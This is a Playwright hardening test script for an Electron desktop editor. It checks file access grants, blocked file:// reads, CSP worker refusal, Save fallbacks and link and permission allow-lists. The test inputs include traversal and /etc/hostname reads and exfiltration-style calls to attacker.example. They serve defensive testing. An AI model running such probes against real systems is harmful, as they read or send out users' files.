#!/usr/bin/env node
/**
 * Desktop hardening check: drives the REAL Electron app (production build in dist/) and verifies the
 * main-process contract — file access policy, Save As extension fix, crash-safe large writes,
 * second-instance file forwarding (also while the page reloads), cold-start file open, an already-open
 * project never opening twice (OS / File ▸ Open / Open Recent), Save falling back to Save As (read-only
 * file, missing folder), the page being unable to read local files outside its bundle (file:// fetch /
 * XHR / <img>), close guard (dirty / hung / crashed renderer / stuck prompt / Windows session end),
 * unresponsive → Reload (and its safety net), window-state persistence, navigation/external-link/
 * permission policy, the titlebar overlay following the UI zoom, and zero console errors / CSP
 * violations / Electron security warnings.
 *
 *   npx vite build && xvfb-run -a -s "-screen 0 1600x960x24" node scripts/electron-desktop-check.mjs \
 *     [--out shot.png] [--tmp dir] [--full] [--app dir]
 *
 * --full also opens every template/panel, drags every tool and runs every safe command inside Electron
 * (the browser smoke test's coverage, but under the app's real CSP and file:// origin).
 * --app runs a copy of the app (a folder with electron/, package.json, dist/ and build/) instead of the repo.
 * Phase D runs the app from an install folder named like "100% Art #1 ?q Ünï 25%ad" and checks that the
 * editor loads and its IPC is trusted there; phase E removes the bundle (at start, and under a running app
 * before a crash / hang reload) and checks that every failed load says so and that files handed over
 * meanwhile open after "Try Again". Packaged-only behaviour (VITE_DEV_SERVER_URL ignored,
 * fuses, asar) is checked by scripts/electron-packaged-check.mjs.
 * Linux only (isolates userData with XDG_CONFIG_HOME). Exit code 1 on any failure.
 */
import { _electron as electron } from 'playwright-core';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execFileSync, spawn } from 'node:child_process';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { createRequire } from 'node:module';

const root = path.join(path.dirname(fileURLToPath(import.meta.url)), '..');
const require = createRequire(import.meta.url);
const electronPath = require('electron');
const argv = process.argv.slice(2);
const arg = (k, d) => {
  const i = argv.indexOf(`--${k}`);
  return i >= 0 ? (argv[i + 1] && !argv[i + 1].startsWith('--') ? argv[i + 1] : true) : d;
};
const out = arg('out', 'electron-desktop-check.png');
const full = !!arg('full', false);
/** The app folder to launch (electron/, package.json, dist/, build/): the repo by default, or a copy. */
const appDir = typeof arg('app', null) === 'string' ? path.resolve(arg('app', null)) : root;
const T = arg('tmp', null) || fs.mkdtempSync(path.join(os.tmpdir(), 'perseverance-desktop-'));
fs.rmSync(T, { recursive: true, force: true });
const FILES = path.join(T, 'files');
const CFG = path.join(T, 'cfg');
fs.mkdirSync(FILES, { recursive: true });
fs.mkdirSync(CFG, { recursive: true });

const env = {
  ...process.env,
  XDG_CONFIG_HOME: CFG,
  PERSEVERANCE_CLOSE_TIMEOUT_MS: '1500',
  PERSEVERANCE_REPEAT_CLOSE_MS: '1500',
  PERSEVERANCE_RELOAD_TIMEOUT_MS: '3000',
};
delete env.ELECTRON_DISABLE_SECURITY_WARNINGS; // we want to see them
delete env.VITE_DEV_SERVER_URL;

const results = [];
const measurements = {};
const sizeOf = (p) => (fs.existsSync(p) ? fs.statSync(p).size : -1);
const mtimeOf = (p) => (fs.existsSync(p) ? fs.statSync(p).mtimeMs : -1);
/** Print the summary and exit (also when a step throws, so one broken step doesn't hide the rest). */
function finish(crash) {
  if (crash) check('check script ran to the end', false, String((crash && crash.stack) || crash).split('\n').slice(0, 4).join(' | '));
  console.log('MEASUREMENTS', JSON.stringify(measurements));
  const failed = results.filter((r) => !r.ok);
  console.log(`\n${results.length - failed.length}/${results.length} checks passed`);
  if (failed.length) {
    console.error('FAILED:\n' + failed.map((f) => `  - ${f.name}`).join('\n'));
    process.exit(1);
  }
  console.log('DESKTOP CHECK OK');
  process.exit(0);
}
process.on('uncaughtException', (e) => finish(e));
process.on('unhandledRejection', (e) => finish(e));
function check(name, ok, detail = '') {
  results.push({ name, ok: !!ok, detail });
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${detail ? `  — ${typeof detail === 'string' ? detail : JSON.stringify(detail)}` : ''}`);
}
const wait = (ms) => new Promise((r) => setTimeout(r, ms));
async function poll(fn, timeout = 8000, every = 150) {
  const t0 = Date.now();
  for (;;) {
    const v = await Promise.race([fn().catch(() => undefined), wait(3000).then(() => undefined)]);
    if (v) return v;
    if (Date.now() - t0 > timeout) return v;
    await wait(every);
  }
}

/**
 * Main-process test doubles for native dialogs / shell, recording into globalThis.__t. Self-contained (no
 * outer variables): launch() runs it through app.evaluate once the window exists, and the cold-start
 * phase writes its source into the app's entry module so it is in place before main.cjs runs.
 * `hold`: message boxes stay open until release() answers them (like a real box nobody answered yet).
 */
function installMainDoubles({ app, BrowserWindow, dialog, shell, ipcMain }, { hold = false } = {}) {
  const t = (globalThis.__t = { console: [], boxes: [], boxAnswers: [], hold, saveQueue: [], saves: [], saveOpts: [], openQueue: [], external: [], revealed: [], ipc: [] });
  globalThis.__held = []; // answers for boxes held open (functions: kept out of __t, which the check reads)
  for (const ch of ['desktop:close-ack', 'desktop:confirm-close']) ipcMain.on(ch, (_e, v) => t.ipc.push(`${ch}=${v}@${Date.now()}`));
  const watch = (w) => w.webContents.on('console-message', (e) => t.console.push({ level: e.level, message: e.message, source: e.sourceId }));
  const w0 = BrowserWindow.getAllWindows()[0];
  if (w0) watch(w0);
  else app.once('browser-window-created', (_e, w) => watch(w));
  dialog.showSaveDialog = async (...a) => {
    const o = a.length > 1 ? a[1] : a[0];
    t.saves.push(o?.defaultPath ?? null);
    t.saveOpts.push(JSON.parse(JSON.stringify(o ?? {})));
    const p = t.saveQueue.shift();
    return p ? { canceled: false, filePath: p } : { canceled: true, filePath: '' };
  };
  dialog.showMessageBox = async (...a) => {
    const o = a.length > 1 ? a[1] : a[0];
    const box = { message: o.message, buttons: o.buttons, at: Date.now(), visible: !!BrowserWindow.getAllWindows()[0]?.isVisible() };
    t.boxes.push(box);
    if (t.hold) {
      // Open until the check answers it with release(), or the app takes it back (a newer prompt aborts it).
      return new Promise((resolve) => {
        const answer = (response) => {
          box.answered = response;
          resolve({ response, checkboxChecked: false });
        };
        globalThis.__held.push(answer);
        o.signal?.addEventListener('abort', () => {
          box.dismissed = true;
          globalThis.__held = globalThis.__held.filter((f) => f !== answer);
          resolve({ response: o.cancelId ?? 0, checkboxChecked: false });
        });
      });
    }
    return { response: t.boxAnswers.length ? t.boxAnswers.shift() : (o.cancelId ?? 0), checkboxChecked: false };
  };
  dialog.showOpenDialog = async () => {
    const p = t.openQueue.shift();
    return p ? { canceled: false, filePaths: [p] } : { canceled: true, filePaths: [] };
  };
  shell.openExternal = async (url) => void t.external.push(url);
  shell.showItemInFolder = (p) => void t.revealed.push(p);
}

/** Launch the app with main-process test doubles for native dialogs / shell. */
async function launch(extraArgs = [], { dir = appDir, launchEnv = env } = {}) {
  const app = await electron.launch({ executablePath: electronPath, args: [dir, '--no-sandbox', ...extraArgs], env: launchEnv, cwd: T });
  const exited = new Promise((r) => app.process().once('exit', (code) => r(code)));
  const page = await app.firstWindow();
  await app.evaluate(installMainDoubles);
  return { app, page, exited };
}

const main = (app, fn, a) => app.evaluate(fn, a);
const T_ = (app) => main(app, () => globalThis.__t);
const queueSave = (app, p) => main(app, (_e, p) => globalThis.__t.saveQueue.push(p), p);
const answerBox = (app, n) => main(app, (_e, n) => globalThis.__t.boxAnswers.push(n), n);
/** Answer the oldest message box held open (installMainDoubles hold mode). True when there was one. */
const release = (app, n) =>
  main(app, (_e, n) => {
    const answer = globalThis.__held.shift();
    answer?.(n);
    return !!answer;
  }, n);
const windowCount = (app) => main(app, ({ BrowserWindow }) => BrowserWindow.getAllWindows().length).catch(() => 0);
const closeWindow = (app) => main(app, ({ BrowserWindow }) => BrowserWindow.getAllWindows()[0].close());
const sessions = (page) =>
  page.evaluate(() => Object.values(window.__app.useEditor.getState().sessions).map((s) => ({ id: s.doc.id, name: s.doc.name, path: s.filePath ?? null, dirty: !!s.dirty })));

async function installCspProbe(page) {
  await page.addInitScript(() => {
    window.__csp = [];
    document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(`${e.violatedDirective} ${e.blockedURI}`));
  });
}

async function waitReady(page) {
  await page.waitForFunction(() => !!window.__app && !!document.querySelector('.shell-root'), null, { timeout: 30000 });
  await wait(800);
}

async function openTemplate(page, id = 'tpl-crimson-thumbnail') {
  await page.evaluate(async (tid) => {
    const a = window.__app;
    const doc = await a.templates.get(tid).build();
    a.useEditor.getState().openDocument(doc, { label: 'Template' });
  }, id);
  await wait(600);
}

async function makeDirty(page) {
  await page.evaluate(() => {
    const st = window.__app.useEditor.getState();
    st.commit('Desktop check edit', (d) => {
      d.guides.push({ id: `g-${Date.now()}`, orientation: 'horizontal', position: 24 });
    });
  });
}

/** Wait for an in-app dialog showing `text`, then click its `button`. Uses evaluate polling (not
 * waitForSelector): after a blocked navigation Playwright keeps waiting for it and selector waits hang. */
async function answerPrompt(page, text, button, timeout = 6000) {
  const found = await poll(() => page.evaluate((t) => document.body.innerText.includes(t), text), timeout);
  if (!found) return false;
  return page.evaluate((label) => {
    const btn = [...document.querySelectorAll('button')].reverse().find((b) => b.textContent.trim() === label);
    btn?.click();
    return !!btn;
  }, button);
}

const sameBytes = (a, b) => Buffer.compare(fs.readFileSync(a), fs.readFileSync(b)) === 0;

/* ======================================================================== */
/* Phase A                                                                   */
/* ======================================================================== */
let { app, page, exited } = await launch();
await installCspProbe(page);
await page.reload();
await waitReady(page);

const info = await page.evaluate(() => ({ desktop: !!window.desktop, platform: window.desktop?.platform, version: window.desktop?.version, url: location.href }));
const userData = await main(app, ({ app }) => app.getPath('userData'));
check('desktop bridge present', info.desktop && /index\.html$/.test(info.url), info);
const prefs = await main(app, ({ BrowserWindow }) => {
  const p = BrowserWindow.getAllWindows()[0].webContents.getLastWebPreferences();
  return { contextIsolation: p.contextIsolation, sandbox: p.sandbox, nodeIntegration: p.nodeIntegration, webviewTag: p.webviewTag, webSecurity: p.webSecurity };
});
check('webPreferences locked down', prefs.contextIsolation === true && prefs.sandbox === true && !prefs.nodeIntegration && !prefs.webviewTag && prefs.webSecurity !== false, prefs);
check('renderer has no Node', await page.evaluate(() => typeof window.require === 'undefined' && typeof window.process === 'undefined'));
const webgl = await page.evaluate(() => {
  const g = document.createElement('canvas').getContext('webgl2');
  const ext = g && g.getExtension('WEBGL_debug_renderer_info');
  return g ? (ext ? g.getParameter(ext.UNMASKED_RENDERER_WEBGL) : 'available') : null;
});
check('WebGL available for Pose Studio (software fallback without a usable GPU)', !!webgl, webgl);

/* ---- Save As without extension ---- */
await openTemplate(page);
const poster = path.join(FILES, 'Poster.pgfx');
await queueSave(app, path.join(FILES, 'Poster'));
await page.evaluate(() => window.__app.commands.get('file.saveAs').run());
await poll(async () => fs.existsSync(poster));
let ss = await sessions(page);
check('Save As appends .pgfx when the name has no extension', fs.existsSync(poster) && !fs.existsSync(path.join(FILES, 'Poster')) && ss.some((s) => s.path === poster && s.name === 'Poster' && !s.dirty), { files: fs.readdirSync(FILES), sessions: ss });
check('saved file is a PGFX container', fs.existsSync(poster) && fs.readFileSync(poster).subarray(0, 4).toString() === 'PGFX');
// Keep going after a failed extension fix so the remaining checks still report.
if (!fs.existsSync(poster) && fs.existsSync(path.join(FILES, 'Poster'))) fs.copyFileSync(path.join(FILES, 'Poster'), poster);
const title = await main(app, ({ BrowserWindow }) => BrowserWindow.getAllWindows()[0].getTitle());
check('window title follows the document', /Poster/.test(title), title);

/* ---- Save As onto an existing file after the extension fix asks first ---- */
await queueSave(app, path.join(FILES, 'Poster'));
const mtime0 = mtimeOf(poster);
const cancelled = await page.evaluate(async () => {
  const d = window.desktop;
  return d.saveFile({ title: 'Save As', defaultPath: 'Poster.pgfx', filters: [{ name: 'Perseverance Project', extensions: ['pgfx'] }], data: 'nope' });
});
let t = await T_(app);
check('extension fix never silently overwrites an existing file', cancelled === null && mtimeOf(poster) === mtime0 && t.boxes.some((b) => /already exists/.test(b.message)), { cancelled });

/* ---- read/write round trip ---- */
const rt = await page.evaluate(async (p) => {
  const d = window.desktop;
  const a = await d.readFile(p);
  const u = new Uint8Array(a);
  const mod = new Uint8Array(u.length + 3);
  mod.set(u);
  mod.set([1, 2, 3], u.length);
  await d.writeFile(p, mod.buffer);
  const b = new Uint8Array(await d.readFile(p));
  await d.writeFile(p, a);
  return { size: u.length, size2: b.length, tail: [...b.slice(-3)] };
}, poster);
check('writeFile/readFile round trip on a saved path', rt.size2 === rt.size + 3 && rt.tail.join() === '1,2,3' && sizeOf(poster) === rt.size, rt);
check('no temp files left after writes', fs.readdirSync(FILES).every((f) => !f.endsWith('.tmp')), fs.readdirSync(FILES));

/* ---- access policy ---- */
const evil = path.join(FILES, 'evil.txt');
const legacy = path.join(FILES, 'legacy.pgfx');
fs.copyFileSync(poster, legacy);
fs.writeFileSync(path.join(FILES, 'fake.pgfx'), 'not a project');
const denials = await page.evaluate(
  async ({ evil, poster, legacy, files, userData }) => {
    const d = window.desktop;
    const attempt = async (fn) => {
      try {
        const r = await fn();
        return `ALLOWED${r && r.byteLength !== undefined ? ` (${r.byteLength} bytes)` : ''}`;
      } catch (e) {
        return `denied: ${String(e.message).replace(/^Error invoking remote method '[^']+': /, '').slice(0, 90)}`;
      }
    };
    return {
      writeUnchosen: await attempt(() => d.writeFile(evil, 'pwned')),
      readSystemFile: await attempt(() => d.readFile('/etc/hostname')),
      readTraversal: await attempt(() => d.readFile(`${files}/../cfg/Perseverance/file-access.json`)),
      writeGrantsFile: await attempt(() => d.writeFile(`${userData}/file-access.json`, '{}')),
      readRelative: await attempt(() => d.readFile('Poster.pgfx')),
      writeBadData: await attempt(() => d.writeFile(poster, { length: 1 })),
      writeNumberPath: await attempt(() => d.writeFile(42, 'x')),
      readFakeProject: await attempt(() => d.readFile(`${files}/fake.pgfx`)),
      writeLegacy: await attempt(() => d.writeFile(legacy, 'x')),
      readUnchosenProject: await attempt(() => d.readFile(legacy)),
      revealSystemFile: (d.showItemInFolder('/etc/hostname'), 'sent'),
    };
  },
  { evil, poster, legacy, files: FILES, userData },
);
const mustDeny = ['writeUnchosen', 'readSystemFile', 'readTraversal', 'writeGrantsFile', 'readRelative', 'writeBadData', 'writeNumberPath', 'readFakeProject', 'writeLegacy', 'readUnchosenProject'];
check('paths the user never chose are refused (also real projects)', mustDeny.every((k) => denials[k].startsWith('denied')) && !fs.existsSync(evil) && sameBytes(legacy, poster), denials);

/* ---- an unchosen path is refused before the main process touches it (FIFOs can't block its I/O) ---- */
const fifos = [0, 1, 2, 3, 4].map((i) => path.join(FILES, `fifo${i}.pgfx`));
for (const f of fifos) execFileSync('mkfifo', [f]);
const fifoRun = await page.evaluate(
  async ({ fifos, poster }) => {
    const d = window.desktop;
    const t0 = performance.now();
    const reads = Promise.all(fifos.map((f) => d.readFile(f).then(() => 'ALLOWED', (e) => (String(e.message).includes('ENOTGRANTED') ? 'denied' : e.message))));
    const r = await Promise.race([reads, new Promise((res) => setTimeout(() => res(fifos.map(() => 'blocked (still opening the FIFO)')), 3000))]);
    const deniedMs = Math.round(performance.now() - t0);
    const t1 = performance.now();
    const ok = await Promise.race([d.readFile(poster).then((b) => b.byteLength > 0), new Promise((res) => setTimeout(() => res('timeout'), 4000))]);
    return { r, deniedMs, chosenReadOk: ok, chosenReadMs: Math.round(performance.now() - t1) };
  },
  { fifos, poster },
);
// Release main-process threads still blocked opening a FIFO (only when the policy failed), so the rest
// of the run is not stuck behind them.
for (const f of fifos) {
  try {
    fs.closeSync(fs.openSync(f, fs.constants.O_WRONLY | fs.constants.O_NONBLOCK));
  } catch {
    /* ENXIO: nobody is reading it (expected) */
  }
  fs.rmSync(f, { force: true });
}
check('unchosen FIFOs named .pgfx are refused at once and reads of chosen files keep working', fifoRun.r.every((x) => x === 'denied') && fifoRun.deniedMs < 1000 && fifoRun.chosenReadOk === true, fifoRun);

/* ---- the page itself can't read local files outside its bundle (Electron's file:// privileges) ---- */
const secret = path.join(FILES, 'secret.txt');
fs.writeFileSync(secret, 'top secret');
const outsidePng = path.join(FILES, 'outside.png');
fs.copyFileSync(path.join(root, 'build', 'icon.png'), outsidePng);
const fileReads = await page.evaluate(
  async ({ secret, png }) => {
    const url = (p) => new URL(`file://${p}`).href;
    const tryFetch = async (u) => {
      try {
        const r = await fetch(u);
        return `ALLOWED ${r.status} ${(await r.text()).length} chars`;
      } catch (e) {
        return `blocked ${e.name}`;
      }
    };
    const tryXhr = (u) =>
      new Promise((res) => {
        const x = new XMLHttpRequest();
        x.open('GET', u);
        x.onload = () => res(`ALLOWED ${x.status} ${String(x.responseText).length} chars`);
        x.onerror = () => res('blocked');
        x.send();
      });
    const tryImg = (u) =>
      new Promise((res) => {
        const i = new Image();
        i.onload = () => res(`ALLOWED ${i.naturalWidth}px`);
        i.onerror = () => res('blocked');
        i.src = u;
      });
    return {
      fetchSystemFile: await tryFetch('file:///etc/hostname'),
      fetchUserFile: await tryFetch(url(secret)),
      xhrUserFile: await tryXhr(url(secret)),
      imgUserFile: await tryImg(url(png)),
      fetchTraversal: await tryFetch(new URL('../../../../../../../../etc/hostname', location.href).href),
      fetchEncodedTraversal: await tryFetch(location.href.replace(/index\.html$/, '%2e%2e/%2e%2e/package.json')),
      fetchOwnBundle: await tryFetch(new URL('./favicon.png', location.href).href),
    };
  },
  { secret, png: outsidePng },
);
const PROBE_RE = /secret\.txt|outside\.png|etc\/hostname|%2e%2e\/package\.json/;
check(
  'the page cannot read local files outside its bundle (fetch / XHR / <img> of file:// URLs)',
  Object.entries(fileReads).every(([k, v]) => (k === 'fetchOwnBundle' ? v.startsWith('ALLOWED 200') : v.startsWith('blocked'))),
  fileReads,
);

/* ---- …nor through a Worker: worker requests never reach the main process' file:// filter, so the CSP
 * (worker-src 'none') must stop every worker from starting at all ---- */
const workerScript = path.join(FILES, 'probe-worker.js');
fs.writeFileSync(workerScript, "postMessage('RAN outside-dist worker script');");
const consoleBeforeWorkers = (await T_(app)).console.length;
const workers = await page.evaluate(
  async ({ secret, workerScript }) => {
    const fileUrl = (p) => new URL(`file://${p}`).href;
    // Each worker posts "started" first: any message at all means it ran (the load was not refused).
    const body = `postMessage('started');
      (async () => {
        for (const u of ${JSON.stringify(['file:///etc/hostname', fileUrl(secret)])}) {
          try { postMessage('READ ' + (await (await fetch(u)).text()).slice(0, 20)); } catch (e) { postMessage('fetch blocked ' + e.name); }
        }
      })();`;
    const blob = (src) => URL.createObjectURL(new Blob([src], { type: 'text/javascript' }));
    const watch = (target, start) =>
      new Promise((res) => {
        const got = [];
        const done = (v) => {
          clearTimeout(timer);
          res(v);
        };
        const timer = setTimeout(() => done(got.length ? `RAN: ${got.join(' | ')}` : 'refused (never started)'), 2500);
        target.onmessage = (e) => {
          got.push(String(e.data));
          if (got.length >= 3) done(`RAN: ${got.join(' | ')}`);
        };
        target.onerror = (e) => {
          e?.preventDefault?.();
          if (!got.length) done('refused (error event)');
        };
        start?.();
      });
    const attempt = async (make) => {
      try {
        return await make();
      } catch (e) {
        return `refused (${e.name})`;
      }
    };
    return {
      blobWorker: await attempt(() => watch(new Worker(blob(body)))),
      blobModuleWorker: await attempt(() => watch(new Worker(blob(body), { type: 'module' }))),
      fileWorkerOutsideDist: await attempt(() => watch(new Worker(fileUrl(workerScript)))),
      sharedWorker: await attempt(() => {
        const sw = new SharedWorker(blob(`onconnect = (c) => { const port = c.ports[0]; port.postMessage('started'); fetch(${JSON.stringify(fileUrl(secret))}).then((r) => r.text()).then((t) => port.postMessage('READ ' + t), (e) => port.postMessage('fetch blocked ' + e.name)); };`));
        sw.onerror = (e) => sw.port.onerror?.(e);
        return watch(sw.port, () => sw.port.start());
      }),
      serviceWorker: await attempt(async () => {
        if (!navigator.serviceWorker) return 'refused (no API)';
        await navigator.serviceWorker.register('./probe-sw.js');
        return 'RAN: registered';
      }),
    };
  },
  { secret, workerScript },
);
await wait(300);
// The refusals are logged as CSP errors on purpose: keep them out of the "no CSP violations / console
// errors" checks below (any other worker the app itself tried to start would still show up there).
const workerProbeConsole = new Set((await T_(app)).console.slice(consoleBeforeWorkers).filter((m) => /worker|probe-sw/i.test(m.message)).map((m) => m.message));
check('the page cannot start workers (blob / module / outside-dist file / shared / service worker)', Object.values(workers).every((v) => v.startsWith('refused')), workers);
await wait(200);
t = await T_(app);
check('showItemInFolder limited to chosen files / data folder', !t.revealed.includes('/etc/hostname'), t.revealed);

/* ---- Save to an ungranted project path falls back to Save As ---- */
const savesBefore = (await T_(app)).saves.length;
await page.evaluate((p) => {
  const st = window.__app.useEditor.getState();
  st.setFilePath(st.activeDocId, p, false);
}, legacy);
await queueSave(app, path.join(FILES, 'Resaved'));
await page.evaluate(() => window.__app.commands.get('file.save').run());
await poll(async () => fs.existsSync(path.join(FILES, 'Resaved.pgfx')));
t = await T_(app);
// That path was never chosen in the app (no grant), but its folder holds Poster.pgfx, which the user saved
// there: a trusted folder, so the dialog may start at the document's path (see the Save dialog check below).
check('Save on a path without write access goes through Save As', fs.existsSync(path.join(FILES, 'Resaved.pgfx')) && sameBytes(legacy, poster) && t.saves.length === savesBefore + 1 && t.saves.at(-1) === legacy, { saves: t.saves.slice(savesBefore) });

/* ---- second instance forwards (relative) argv ---- */
const second = path.join(FILES, 'Second Copy.pgfx');
fs.copyFileSync(poster, second);
const t2 = Date.now();
const child = spawn(electronPath, [appDir, path.relative(T, second), '--no-sandbox'], { cwd: T, env, stdio: 'ignore' });
const childCode = await new Promise((r) => child.on('exit', r));
const opened = await poll(async () => (await sessions(page)).find((s) => s.path === second), 10000);
measurements.secondInstanceMs = Date.now() - t2;
check('second instance exits and forwards its file (relative path, spaces)', childCode === 0 && !!opened, { childCode, opened, ms: measurements.secondInstanceMs });
const w2 = await page.evaluate((p) => window.desktop.writeFile(p, new ArrayBuffer(0)).then(() => 'ok', (e) => e.message), second);
fs.copyFileSync(poster, second);
check('a project opened from the OS can be saved back in place', w2 === 'ok', w2);

/* ---- the same project handed over again (Explorer double-click on an open file) switches to its tab ---- */
await page.evaluate((p) => {
  const st = window.__app.useEditor.getState();
  const other = Object.values(st.sessions).find((s) => s.filePath !== p);
  if (other) st.setActiveDoc(other.doc.id);
}, second);
await main(
  app,
  ({ app: eApp }, { file, cwd, exe, root }) => eApp.emit('second-instance', {}, [exe, root, file], cwd, { argv: [exe, root, file], cwd }),
  { file: path.relative(T, second), cwd: T, exe: electronPath, root: appDir },
);
const switched = await poll(
  () =>
    page.evaluate((p) => {
      const st = window.__app.useEditor.getState();
      return st.sessions[st.activeDocId]?.filePath === p;
    }, second),
  6000,
);
await wait(300);
const copies = (await sessions(page)).filter((s) => s.path === second).length;
check('an already-open project handed over again switches to its tab (no second copy)', !!switched && copies === 1, { switched, copies });

/* ---- a read-only project: Save never replaces it and falls back to Save As ---- */
// The check runs as any user (root bypasses permission bits), so the main process' fs.access reports
// this one file as read-only, exactly as the OS would for a locked / read-only file.
const locked = path.join(FILES, 'Locked.pgfx');
fs.copyFileSync(poster, locked);
await main(
  app,
  ({ app: eApp }, { file, cwd, exe, root }) => eApp.emit('second-instance', {}, [exe, root, file], cwd, { argv: [exe, root, file], cwd }),
  { file: locked, cwd: T, exe: electronPath, root: appDir },
);
const lockedOpen = await poll(async () => (await sessions(page)).find((s) => s.path === locked), 8000);
const patched = await main(app, () => {
  const fsp = process.mainModule.require('node:fs/promises');
  const orig = fsp.access;
  globalThis.__t.restoreAccess = () => (fsp.access = orig);
  fsp.access = async (p, mode) => {
    if (String(p).endsWith('Locked.pgfx') && mode & 2) throw Object.assign(new Error(`EACCES: permission denied, access '${p}'`), { code: 'EACCES' });
    return orig(p, mode);
  };
  return true;
}).catch((e) => e.message);
await makeDirty(page);
const savesLocked = (await T_(app)).saves.length;
await queueSave(app, path.join(FILES, 'Unlocked'));
await page.evaluate(() => window.__app.commands.get('file.save').run());
const unlocked = await poll(async () => fs.existsSync(path.join(FILES, 'Unlocked.pgfx')), 8000);
const lockedToast = await page.evaluate(() => document.body.innerText.includes("can't be changed (read-only or in use)"));
await main(app, () => globalThis.__t.restoreAccess?.());
t = await T_(app);
check(
  'Save on a read-only project leaves it untouched and offers Save As',
  !!lockedOpen && patched === true && unlocked && sameBytes(locked, poster) && lockedToast && t.saves.length === savesLocked + 1 && t.saves.at(-1) === locked,
  { lockedOpen: !!lockedOpen, patched, unlocked, lockedToast, saves: t.saves.slice(savesLocked) },
);

/* ---- Save in place when the project's folder is gone (USB stick removed) offers Save As ---- */
const goneDir = path.join(FILES, 'gone');
fs.mkdirSync(goneDir);
await queueSave(app, path.join(goneDir, 'Gone'));
await page.evaluate(() => window.__app.commands.get('file.saveAs').run());
const goneSaved = await poll(async () => fs.existsSync(path.join(goneDir, 'Gone.pgfx')), 8000);
fs.rmSync(goneDir, { recursive: true, force: true });
await makeDirty(page);
const savesGone = (await T_(app)).saves.length;
await queueSave(app, path.join(FILES, 'Rescued'));
await page.evaluate(() => window.__app.commands.get('file.save').run());
const rescued = await poll(async () => fs.existsSync(path.join(FILES, 'Rescued.pgfx')), 8000);
const goneToast = await page.evaluate(() => document.body.innerText.includes('no longer available'));
ss = await sessions(page);
t = await T_(app);
check(
  'Save when the project folder is gone explains it and offers Save As',
  !!goneSaved && rescued && goneToast && t.saves.length === savesGone + 1 && ss.some((s) => s.path === path.join(FILES, 'Rescued.pgfx') && !s.dirty),
  { goneSaved: !!goneSaved, rescued, goneToast, saves: t.saves.slice(savesGone) },
);

/* ---- a file forwarded while the page is (re)loading waits for it, then opens once ---- */
const during = path.join(FILES, 'During Reload.pgfx');
fs.copyFileSync(poster, during);
await main(
  app,
  ({ app: eApp, BrowserWindow }, { file, cwd, exe, root }) => {
    const wc = BrowserWindow.getAllWindows()[0].webContents;
    globalThis.__t.loadingAtSend = null;
    const send = wc.send.bind(wc);
    wc.send = (ch, ...a) => {
      if (ch === 'desktop:open-file') globalThis.__t.loadingAtSend = wc.isLoading();
      return send(ch, ...a);
    };
    // Deliver the second instance's argv exactly while the page is reloading (deterministic, unlike a race
    // with a spawned process): the main process must queue it and send it after 'did-finish-load'.
    wc.once('did-start-loading', () => eApp.emit('second-instance', {}, [exe, root, file], cwd, { argv: [exe, root, file], cwd }));
    wc.reload();
  },
  { file: path.relative(T, during), cwd: T, exe: electronPath, root: appDir },
);
await wait(500);
await waitReady(page);
const openedDuring = await poll(async () => {
  const l = (await sessions(page)).filter((s) => s.path === during);
  return l.length ? l : undefined;
}, 10000);
await wait(800);
const openedDuringFinal = (await sessions(page)).filter((s) => s.path === during).length;
await page.evaluate(() => window.__app.useUI.setState({ dialogs: [] })); // e.g. a crash-recovery offer after the reload
t = await T_(app);
check('file forwarded during a reload opens once the page is ready', !!openedDuring && openedDuringFinal === 1 && t.loadingAtSend !== null, { opened: openedDuringFinal, loadingAtSend: t.loadingAtSend });

/* ---- external links, popups, navigation ---- */
const EXTERNAL_OK = ['https://www.roblox.com/users/profile?username=Builderman', 'https://github.com/noxiryn/perseverance/releases', 'https://www.roblox.com/users/1/profile'];
await page.evaluate((ok) => {
  const d = window.desktop;
  d.openExternal('file:///etc/passwd');
  d.openExternal('javascript:alert(1)');
  d.openExternal('smb://evil/share');
  d.openExternal('https://attacker.example/?d=stolen'); // any other site would carry data out
  d.openExternal('http://www.roblox.com/users/1/profile'); // https only
  d.openExternal('https://www.roblox.com.attacker.example/');
  d.openExternal('https://github.com/attacker/repo');
  d.openExternal(ok[0]); // the avatar dialog's profile button
  d.openExternal(ok[1]);
  window.open('https://attacker.example/popup?d=stolen');
  window.open('file:///etc/hostname');
  window.open(ok[2]);
}, EXTERNAL_OK);
await wait(600);
t = await T_(app);
check('openExternal / window.open only hand the allow-listed https pages (Roblox, project page) to the browser', JSON.stringify(t.external) === JSON.stringify(EXTERNAL_OK), t.external);
check('window.open never creates a window', (await windowCount(app)) === 1);

/* ---- permissions ---- */
const perms = await page.evaluate(async () => {
  const r = {};
  try {
    const f = await window.queryLocalFonts();
    r.localFonts = `granted (${f.length} fonts)`;
  } catch (e) {
    r.localFonts = `denied ${e.name}`;
  }
  r.notifications = await Notification.requestPermission();
  r.geolocation = await new Promise((res) =>
    navigator.geolocation.getCurrentPosition(
      () => res('granted'),
      (e) => res(`denied (${e.code})`),
      { timeout: 4000 },
    ),
  );
  try {
    await navigator.clipboard.writeText('perseverance-check');
    r.clipboardWrite = 'granted';
  } catch (e) {
    r.clipboardWrite = `denied ${e.name}`;
  }
  try {
    await document.documentElement.requestFullscreen();
    r.fullscreen = document.fullscreenElement ? 'granted' : 'no-op';
    await document.exitFullscreen();
  } catch (e) {
    r.fullscreen = `denied ${e.name}`;
  }
  try {
    await navigator.requestMIDIAccess({ sysex: true });
    r.midi = 'granted';
  } catch (e) {
    r.midi = `denied ${e.name}`;
  }
  return r;
});
check(
  'permissions: fonts/clipboard/fullscreen granted, everything else denied',
  perms.localFonts.startsWith('granted') && perms.clipboardWrite === 'granted' && perms.fullscreen === 'granted' && perms.notifications === 'denied' && perms.geolocation.startsWith('denied') && perms.midi.startsWith('denied'),
  perms,
);
await wait(400);

/* ---- UI zoom bridge + caption overlay height ---- */
const zoom = await page.evaluate(async () => {
  const measure = () => {
    const el = document.createElement('div');
    el.style.cssText = 'position:fixed;left:0;top:0;width:1px;height:env(titlebar-area-height, 0px)';
    document.body.append(el);
    const h = el.getBoundingClientRect().height;
    el.remove();
    return Math.round(h * 100) / 100;
  };
  const before = { dpr: devicePixelRatio, overlay: measure() };
  window.desktop.setZoomFactor(1.25);
  await new Promise((r) => setTimeout(r, 400));
  const zoomed = { dpr: devicePixelRatio, overlay: measure() };
  window.desktop.setZoomFactor(1);
  await new Promise((r) => setTimeout(r, 400));
  return { before, zoomed, reset: devicePixelRatio };
});
measurements.zoom = zoom;
